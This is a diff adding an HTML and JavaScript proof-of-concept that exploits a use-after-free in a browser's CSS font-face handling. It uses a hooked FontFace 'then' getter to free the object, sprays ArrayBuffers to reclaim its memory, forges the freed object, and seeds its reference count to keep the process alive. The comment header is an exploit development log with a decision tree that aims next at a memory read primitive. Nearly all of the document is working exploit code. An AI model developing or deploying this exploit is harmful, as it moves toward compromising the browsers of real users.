@@ -1,0 +1,238 @@
+<!--
+  p674: spray-time rc seed — p669-clamp base (keepspray via __sprayAlive,
+  batch-only beacons, OBS cross-round telemetry, ROUNDS=8, /size benign
+  layout) with TWO deltas:
+    1. SEED: lanes get +0x00 (u32) = 1, +0x04 = 0, +0x44 float =
+       100+round+i*0.001; everything else zero (incl. +0x08 variant = 0,
+       the /size-proven benign layout).
+    2. NO LATE WRITES AT ALL: the opCount clamp is REMOVED entirely.
+       Justification (law 6, p670/p671/p672): ANY write to a hit lane in
+       the LATE window (+3500..+3900) kills pre-R1 — m_table=0 (p670),
+       rc=0x7FFFFFF0 (p671), rc=2 (p672) all died 9/9 pre-R1. OBS reads
+       remain (p669: OBS-only survived R1 — reads are safe).
+
+  INCREMENT-DEDUCTION TABLE (tonight's logs):
+    p663-p667: seed +0x00 = 100+round  ->  readback rc = 101  (+1)
+    p668 /zero: seed +0x00 = 0 (zeroed) ->  readback rc = 1   (+1)
+    => the engine INCREMENTS rc at reclaim-setup (ref()); it never writes
+       an absolute value. THEREFORE seed 1 -> post-reclaim rc = 2.
+    With rc = 2 held by the engine's own ref, the teardown deref lands
+    2 -> 1, NEVER 0: ~CSSFontFace cannot run (RefCounted.h:129-144,
+    :187-192 — delete only when m_refCount-1 == 0) => the rank-D killer
+    (~HashTable -> deallocateTable(T dangling) -> free(T-16),
+    HashTable.h:420-428/:1163-1170) is neutralized WITHOUT any post-spray
+    write. /size already proved (9/9) the benign layout passes round-1
+    teardown reads; the only remaining killer was the R2 destructor.
+
+  RESIDUAL RISK (honest): if CSSFontFaceSet::remove's Ref-protect deref
+  runs TWICE on the forged face across rounds, rc 2 -> 1 -> 0 = destructor
+  fires anyway. Tonight's /size OBS showed rc CONSTANT at 1 across r0/r1
+  (no intermediate derefs observed) => likely single deref at final
+  teardown. If death returns at R2, seed rc=3 next (p674b).
+
+  Expected post-reclaim signature: R0 hit line shows rc=2 (seed 1 + engine
+  +1). OBS across rounds: rc=2 constant = no derefs (destructor blocked,
+  nothing touching it); rc=1 appearing = one deref happened (final-teardown
+  candidate); rc=0 would mean death imminent.
+
+  Decision tree:
+    (a) ALIVE end-r8-rcseed ......... STABLE FORGE COMPLETE — vector 10/10.
+        Next: read-primitive design on the stable host (T-relative reads).
+    (b) death at R2 ................. double-deref (or second ref holder
+        dropping) — seed rc=3 (p674b) via same file pattern.
+    (c) death pre-R1 ................ +0x00 seed lethal in this generation
+        (contradicts p663-667 increments — investigate: maybe rc>1 at
+        reclaim changes an engine branch, e.g. adopt path checks refCount).
+
+  Beacon: P674-.  CRASH_CLASS: MEDIUM.
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p674</title></head>
+<body>p674: spray-time rc seed (rc=1 seed, r8)
+<pre id="log" style="color:#0f0;background:#000;font:12px monospace;padding:8px;white-space:pre-wrap"></pre>
+<script>
+(function() {
+'use strict';
+var L = document.getElementById('log');
+var bQ = [];
+function emit(tag, msg) {
+  var s = tag + (msg ? ' ' + msg : '');
+  L.textContent += s + '\n';
+  bQ.push(s);
+}
+function flush() {
+  while (bQ.length) {
+    var b = bQ.splice(0, 2).join('|');
+    try { var x = new XMLHttpRequest(); x.open('GET', '/beacon/P674-' + encodeURIComponent(b), false); x.send(); } catch(e) {}
+  }
+}
+window.onerror = function(m) { emit('ERR', String(m).slice(0,120)); flush(); };
+function hex32(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }
+
+emit('START', 'rcseed r8');
+flush();
+
+var ROUNDS = 8;
+var round = 0;
+var results = [];
+var gfired = -1;
+
+var sty = null, ff = null;
+var armed = false;
+var spray = [];
+window.__sprayAlive = [];
+var snap1 = null;
+
+var round0Lane = null;
+var round0T = '';
+var hitLanes = [];
+
+function seedLane(dv, i) {
+  /* p674 seed: rc seed 1 (engine +1 => 2 post-reclaim, destructor
+     blocked), +0x04 zero, benign float marker at +0x44. Rest zero. */
+  dv.setUint32(0x00, 1, true);
+  dv.setUint32(0x04, 0, true);
+  dv.setFloat32(0x44, 100 + round + i * 0.001, true);
+}
+
+Object.defineProperty(FontFace.prototype, 'then', {
+  configurable: true,
+  get: function() {
+    if (!armed) return undefined;
+    armed = false;
+    gfired = round;
+    try { sty.remove(); } catch(e) {}
+    try { document.fonts.delete(this); } catch(e) {}
+    document.body.offsetHeight;
+    spray = window.__sprayAlive[round] = [];
+    for (var i = 0; i < 24; i++) {
+      var ab = new ArrayBuffer(192);
+      var dv = new DataView(ab);
+      seedLane(dv, i);
+      spray.push(dv);
+    }
+    return undefined;
+  },
+  set: function() {}
+});
+
+function dumpLane(dv) {
+  var out = [];
+  for (var off = 0; off <= 0xB8; off += 8) {
+    var lo = dv.getUint32(off, true), hi = dv.getUint32(off + 4, true);
+    if (lo !== 0 || hi !== 0) out.push(off.toString(16) + ':' + hex32(hi) + hex32(lo));
+  }
+  return out.join(',');
+}
+
+function scanHit() {
+  for (var i = 0; i < spray.length; i++) {
+    if (spray[i].getUint32(0x58, true) !== 0 || spray[i].getUint32(0x5C, true) !== 0) return i;
+  }
+  return -1;
+}
+
+/* OBS: read-only telemetry on the R0 forged lane (reads are safe — p669) */
+function obsR0Lane() {
+  if (!round0Lane) return;
+  try {
+    var tNow = hex32(round0Lane.getUint32(0x5C, true)) + hex32(round0Lane.getUint32(0x58, true));
+    emit('OBS r' + round, 'opc=' + round0Lane.getUint32(0x60, true) +
+         ' rc=' + round0Lane.getUint32(0x00, true) +
+         ' st=' + round0Lane.getUint8(0x82) +
+         ' Tsame=' + (tNow === round0T ? 'y' : 'n'));
+  } catch(e) { emit('OBS r' + round, 'ERR ' + String(e).slice(0,60)); }
+}
+
+/* NOTE: no clampLanes, no rcSweep, no nullTables — law 6: NO LATE WRITES. */
+
+function trackHit(hit) {
+  var dv = spray[hit];
+  if (round === 0) round0Lane = dv;
+  hitLanes.push({ tag: 'r' + round, dv: dv });
+}
+
+function beginRound() {
+  sty = document.createElement('style');
+  sty.textContent = "@font-face { font-family: s" + round + "; src: local(Arial); unicode-range: U+0042; }";
+  document.head.appendChild(sty);
+  ff = new FontFace('f' + round, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+  document.fonts.add(ff);
+  void ff.loaded;
+  window.__facesAlive = window.__facesAlive || [];
+  window.__facesAlive.push(ff);
+  armed = true;
+  document.fonts.load('1em f' + round + ', s' + round, 'AB');
+  setTimeout(analyzeEarly, 150);
+  setTimeout(analyzeLate, 3500);
+}
+
+function analyzeEarly() {
+  try {
+    obsR0Lane();
+    var hit = scanHit();
+    if (hit < 0) {
+      emit('R' + round, 'MISS gf=' + gfired);
+      results.push({ r: round, lane: -1, t: '-', w: '-' });
+    } else {
+      var dv = spray[hit];
+      snap1 = dumpLane(dv);
+      var tLo = dv.getUint32(0x58, true), tHi = dv.getUint32(0x5C, true);
+      var wLo = dv.getUint32(0x68, true), wHi = dv.getUint32(0x6C, true);
+      var dirtyNear = 0;
+      for (var j = Math.max(0, hit - 3); j <= Math.min(spray.length - 1, hit + 3); j++) {
+        if (spray[j].getUint32(0x58, true) !== 0 || spray[j].getUint32(0x5C, true) !== 0) dirtyNear++;
+      }
+      results.push({ r: round, lane: hit, t: hex32(tHi) + hex32(tLo), w: hex32(wHi) + hex32(wLo) });
+      if (round === 0) round0T = hex32(tHi) + hex32(tLo);
+      trackHit(hit);
+      emit('R' + round, 'hit=' + hit + ' T=' + hex32(tHi) + hex32(tLo) +
+           ' W=' + hex32(wHi) + hex32(wLo) + ' rc=' + dv.getUint32(0x00, true) +
+           ' opc=' + dv.getUint32(0x60, true) + ' st82=' + dv.getUint8(0x82) +
+           ' gf=' + gfired + ' dirtyNear=' + dirtyNear +
+           ' seed=' + dv.getFloat32(0x44, true).toFixed(3));
+      emit('R' + round + 'DUMP1', snap1.slice(0, 700));
+    }
+    flush();
+  } catch(e) { emit('R' + round + '-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+function analyzeLate() {
+  try {
+    obsR0Lane();                      /* read-only: telemetry, no writes */
+    var hit = scanHit();
+    if (hit >= 0 && spray.length) {
+      var dv = spray[hit];
+      var snap2s = dumpLane(dv);
+      emit('R' + round + 'LATE', 'alive st82=' + dv.getUint8(0x82) +
+           ' rc=' + dv.getUint32(0x00, true) +
+           ' changed=' + (snap1 !== snap2s ? 'YES' : 'no'));
+      if (snap1 !== snap2s) emit('R' + round + 'DUMP2', snap2s.slice(0, 700));
+    } else {
+      emit('R' + round + 'LATE', 'alive (miss-round)');
+    }
+    flush();
+    round++;
+    if (round < ROUNDS) {
+      gfired = -1;
+      setTimeout(beginRound, 250);
+    } else {
+      var ts = {}, lanes = [];
+      for (var k = 0; k < results.length; k++) {
+        ts[results[k].t] = (ts[results[k].t] || 0) + 1;
+        lanes.push(results[k].lane);
+      }
+      var keys = Object.keys(ts);
+      emit('SUMMARY', 'rcseed rounds=' + results.length + ' kept=' + window.__sprayAlive.length +
+           ' distinctT=' + keys.length + ' lanes=[' + lanes.join(',') + ']');
+      for (var q = 0; q < keys.length; q++) emit('TVAL', keys[q] + ' x' + ts[keys[q]]);
+      emit('ALIVE', 'end-r8-rcseed');
+      flush();
+    }
+  } catch(e) { emit('R' + round + 'LATE-FATAL', String(e).slice(0,150)); flush(); }
+}
+
+setTimeout(beginRound, 50);
+
+})();
+</script>
+</body></html>
